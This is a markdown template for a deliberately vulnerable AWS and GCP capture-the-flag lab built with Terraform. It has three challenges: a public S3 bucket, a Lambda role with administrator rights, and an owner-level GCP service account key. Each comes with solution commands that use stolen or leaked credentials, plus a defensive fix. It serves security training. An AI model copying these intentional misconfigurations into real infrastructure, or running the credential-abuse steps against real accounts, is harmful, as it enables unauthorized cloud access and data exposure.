# Terraform vulnerable lab template

## Terraform Setup (All-in-One cloud hacking Lab)

```
# main.tf
provider "aws" {
  region = "us-east-1"
}

provider "google" {
  credentials = file("gcp-creds.json")
  project     = "your-project-id"
  region      = "us-central1"
}

# Random suffix to avoid bucket naming conflicts
resource "random_id" "suffix" {
  byte_length = 4
}
```

## Beginner: "The Oversharing Bucket" (AWS S3)

Goal: Find/open S3 bucket with flag.txt.

## Terraform

```
resource "aws_s3_bucket" "beginner" {
  bucket = "rootme-beginner-${random_id.suffix.hex}"
  acl    = "public-read"  # Deliberately misconfigured

  tags = {
    Name = "Flag Storage"
  }
}

resource "aws_s3_bucket_object" "flag" {
  bucket = aws_s3_bucket.beginner.id
  key    = "flag.txt"
  content = "FLAG: S3_Leak_${random_id.suffix.hex}"
}
```

### Solution

```bash
aws s3 ls s3://rootme-beginner-[ID] --no-sign-request
aws s3 cp s3://rootme-beginner-[ID]/flag.txt - --no-sign-request
```

### Defensive fix

```
acl = "private"  # Correct setting
```

## Intermediate: "Lambda to EC2 Takeover" (AWS IAM)

Goal: From Lambda, steal IAM keys to access EC2.

## Terraform

```
# Overprivileged Lambda
resource "aws_iam_role" "lambda" {
  name = "overprivileged_lambda_role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = { Service = "lambda.amazonaws.com" }
    }]
  })
}

resource "aws_iam_role_policy_attachment" "lambda_admin" {
  role       = aws_iam_role.lambda.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"  # Deliberately overprivileged
}

resource "aws_lambda_function" "vulnerable" {
  filename      = "lambda.zip"
  function_name = "leaky_lambda"
  role          = aws_iam_role.lambda.arn
  handler       = "index.handler"
  runtime       = "python3.8"
  environment {
    variables = {
      FLAG = "Lambda_Key_${random_id.suffix.hex}"
    }
  }
}

# EC2 instance to compromise
resource "aws_instance" "target" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"
  tags = {
    Name = "Flag_EC2"
  }
}
```

### Solution

* Dump Lambda env vars (via RCE or AWS Console).
* Use stolen keys to query EC2:

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
aws ec2 describe-instances --region us-east-1
```

### Defensive fix

```
policy_arn = "arn:aws:iam::aws:policy/AWSLambdaBasicExecutionRole"  # Least privilege
```

## Advanced: "GCP Org Compromise" (Service Account Key)

Goal: Use leaked key to escalate to project owner.

## Terraform

```
# Leaky GCP Service Account
resource "google_service_account" "leaky" {
  account_id   = "leaky-sa-${random_id.suffix.hex}"
  display_name = "Leaky Service Account"
}

resource "google_project_iam_member" "owner" {
  project = "your-project-id"
  role    = "roles/owner"  # Deliberately overprivileged
  member  = "serviceAccount:${google_service_account.leaky.email}"
}

resource "google_service_account_key" "leaky_key" {
  service_account_id = google_service_account.leaky.name
  public_key_type    = "TYPE_X509_PEM_FILE"
}

output "leaky_key_json" {
  value     = google_service_account_key.leaky_key.private_key
  sensitive = true
}
```

### Solution

1. Activate leaked key:

```bash
echo "$LEAKED_KEY_JSON" > creds.json
gcloud auth activate-service-account --key-file=creds.json
```

2. Exploit owner role:

```bash
gcloud projects get-iam-policy your-project-id  # Confirm access
gcloud compute instances list  # Dump all VMs
```

### Defensive fix

```
role = "roles/logging.viewer"  # Minimal permissions
```

## Deploy all challenges

1. Initialize Terraform:

```bash
terraform init
```

2. Deploy:

```bash
terraform apply -auto-approve
```

3. Destroy (After CTF):

```bash
terraform destroy -auto-approve
```

